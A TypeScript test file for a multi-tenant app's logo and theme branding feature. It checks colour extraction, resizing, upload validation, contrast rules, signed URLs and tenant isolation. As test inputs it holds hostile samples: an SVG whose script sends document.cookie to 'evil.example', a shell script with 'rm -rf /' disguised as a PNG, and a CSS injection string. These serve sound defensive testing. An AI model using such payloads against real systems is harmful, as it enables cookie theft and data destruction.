import { DEFAULT_THEME, contrastRatio, type LogoAnalysis, type PublicBranding } from '@daliz/shared';
import sharp from 'sharp';
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { StorageService } from '../infra/storage.js';
import { TestEnv, type ApiClient, type TestTenant } from './harness.js';

async function logoPng(color: { r: number; g: number; b: number }, width = 800, height = 300): Promise<Buffer> {
  const mark = await sharp({ create: { width: Math.round(width * 0.6), height: Math.round(height * 0.6), channels: 4, background: { ...color, alpha: 1 } } })
    .png()
    .toBuffer();
  return sharp({ create: { width, height, channels: 4, background: { r: 0, g: 0, b: 0, alpha: 0 } } })
    .composite([{ input: mark, gravity: 'center' }])
    .png()
    .toBuffer();
}

describe('branding', () => {
  let t: TestEnv;
  let tenant: TestTenant;
  let owner: ApiClient;

  beforeAll(async () => {
    t = await TestEnv.start();
    tenant = await t.createTenant();
    owner = await t.loggedIn(tenant.ownerEmail);
  });
  afterAll(async () => t?.stop());
  beforeEach(async () => t.clearRateLimits());

  it('extracts brand colors with Color Thief and suggests an accessible theme', async () => {
    const res = await owner.upload<LogoAnalysis>('/branding/logo', 'file', await logoPng({ r: 225, g: 29, b: 72 }), 'logo.png', 'image/png');
    expect(res.status, JSON.stringify(res.body)).toBe(201);
    expect(res.data.width).toBe(800);
    expect(res.data.hasTransparency).toBe(true);
    const [r, g, b] = res.data.dominant;
    expect(Math.abs(r - 225) + Math.abs(g - 29) + Math.abs(b - 72)).toBeLessThan(40);
    expect(contrastRatio(res.data.suggestedTheme.primary, '#ffffff')).toBeGreaterThanOrEqual(4.5);
    expect(Object.keys(res.data.previewUrls)).toEqual(expect.arrayContaining(['header', 'sidebar', 'login', 'favicon-32', 'icon-512']));
  });

  it('generates correctly sized variants without distorting the logo', async () => {
    const res = await owner.upload<LogoAnalysis>('/branding/logo', 'file', await logoPng({ r: 20, g: 90, b: 200 }, 1000, 250), 'wide.png', 'image/png');
    const storage = t.get(StorageService);
    const header = await storage.getBuffer(StorageService.tenantKey(tenant.tenantId, 'branding', res.data.uploadId, 'header.png'));
    const hm = await sharp(header!).metadata();
    expect(hm.height).toBeLessThanOrEqual(96);
    expect(hm.width! / hm.height!).toBeCloseTo(4, 1); // 1000:250 preserved
    const favicon = await storage.getBuffer(StorageService.tenantKey(tenant.tenantId, 'branding', res.data.uploadId, 'favicon-32.png'));
    const fm = await sharp(favicon!).metadata();
    expect([fm.width, fm.height]).toEqual([32, 32]);
    const apple = await storage.getBuffer(StorageService.tenantKey(tenant.tenantId, 'branding', res.data.uploadId, 'icon-180.png'));
    expect((await sharp(apple!).stats()).isOpaque).toBe(true);
  });

  it('sanitizes SVG logos and rejects external references', async () => {
    const hostile = `<svg xmlns="http://www.w3.org/2000/svg" width="400" height="100" onload="alert(1)">
      <script>fetch('https://evil.example/steal?c='+document.cookie)</script>
      <foreignObject><iframe src="https://evil.example"></iframe></foreignObject>
      <rect width="400" height="100" fill="#0f766e"/></svg>`;
    const ok = await owner.upload<LogoAnalysis>('/branding/logo', 'file', Buffer.from(hostile), 'logo.svg', 'image/svg+xml');
    expect(ok.status, JSON.stringify(ok.body)).toBe(201);
    const stored = await t.get(StorageService).getBuffer(StorageService.tenantKey(tenant.tenantId, 'branding', ok.data.uploadId, 'original.svg'));
    const text = stored!.toString('utf8');
    expect(text).not.toMatch(/script|onload|foreignObject|iframe|evil\.example/i);
    expect(text).toMatch(/<rect/);

    const external = `<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10" fill="url(https://evil.example/x.svg#p)"/></svg>`;
    expect((await owner.upload('/branding/logo', 'file', Buffer.from(external), 'x.svg', 'image/svg+xml')).status).toBe(415);
  });

  it('trusts file signatures, not names or declared types', async () => {
    const png = await logoPng({ r: 1, g: 2, b: 3 });
    expect((await owner.upload('/branding/logo', 'file', png, 'logo.jpg', 'image/jpeg')).status).toBe(415);
    expect((await owner.upload('/branding/logo', 'file', Buffer.from('#!/bin/sh\nrm -rf /\n'), 'logo.png', 'image/png')).status).toBe(415);
    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    expect((await owner.upload('/branding/logo', 'file', gif, 'logo.gif', 'image/gif')).status).toBe(415);
  });

  it('enforces size and dimension limits', async () => {
    const tiny = await logoPng({ r: 200, g: 0, b: 0 }, 40, 20);
    expect((await owner.upload('/branding/logo', 'file', tiny, 'tiny.png', 'image/png')).status).toBe(400);
    const huge = Buffer.concat([await logoPng({ r: 0, g: 0, b: 0 }), Buffer.alloc(2 * 1024 * 1024 + 10)]);
    expect((await owner.upload('/branding/logo', 'file', huge, 'huge.png', 'image/png')).status).toBe(413);
  });

  it('refuses to save a theme that fails WCAG AA', async () => {
    const current = await owner.get<{ version: number }>('/branding');
    const bad = await owner.put('/branding', {
      theme: { ...DEFAULT_THEME, primary: '#ffff66', foreground: '#cccccc' },
      logoAssetId: null,
      loginMessage: null,
      version: current.data.version,
    });
    expect(bad.status).toBe(422);
    const injection = await owner.put('/branding', {
      theme: { ...DEFAULT_THEME, primary: 'red;} body{display:none' },
      logoAssetId: null,
      loginMessage: null,
      version: current.data.version,
    });
    expect(injection.status).toBe(422);
  });

  it('publishes the saved logo through signed URLs, served by host', async () => {
    const upload = await owner.upload<LogoAnalysis>('/branding/logo', 'file', await logoPng({ r: 124, g: 58, b: 237 }), 'logo.png', 'image/png');
    const current = await owner.get<{ version: number }>('/branding');
    const saved = await owner.put('/branding', {
      theme: upload.data.suggestedTheme,
      logoAssetId: upload.data.uploadId,
      loginMessage: 'Welcome to the Acme finance workspace',
      version: current.data.version,
    });
    expect(saved.status, JSON.stringify(saved.body)).toBe(200);

    const pub = await t.client(tenant.host).get<PublicBranding>('/public/branding');
    expect(pub.data.theme.primary).toBe(upload.data.suggestedTheme.primary);
    const url = pub.data.logo!.urls.header;
    const img = await t.client().agent.get(url);
    expect(img.status).toBe(200);
    expect(img.headers['content-type']).toBe('image/png');
    expect(img.headers['content-security-policy']).toMatch(/sandbox/);

    const tampered = url.replace(/s=[^&]+/, 's=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
    expect((await t.client().agent.get(tampered)).status).toBe(404);
    const otherVariant = url.replace('header.png', 'login.png');
    expect((await t.client().agent.get(otherVariant)).status).toBe(404);
  });

  it("never serves one tenant's uploads to another tenant", async () => {
    const upload = await owner.upload<LogoAnalysis>('/branding/logo', 'file', await logoPng({ r: 10, g: 150, b: 60 }), 'logo.png', 'image/png');
    const other = await t.createTenant();
    const otherOwner = await t.loggedIn(other.ownerEmail);
    expect((await otherOwner.get(`/branding/uploads/${upload.data.uploadId}/header.png`)).status).toBe(404);
    const current = await otherOwner.get<{ version: number }>('/branding');
    const steal = await otherOwner.put('/branding', { theme: DEFAULT_THEME, logoAssetId: upload.data.uploadId, loginMessage: null, version: current.data.version });
    expect(steal.status).toBe(400);
  });

  it('needs branding.update to change branding', async () => {
    const employee = await t.loggedIn((await t.addUser(tenant.tenantId, 'employee')).email);
    expect((await employee.upload('/branding/logo', 'file', await logoPng({ r: 0, g: 0, b: 0 }), 'l.png', 'image/png')).status).toBe(403);
  });
});
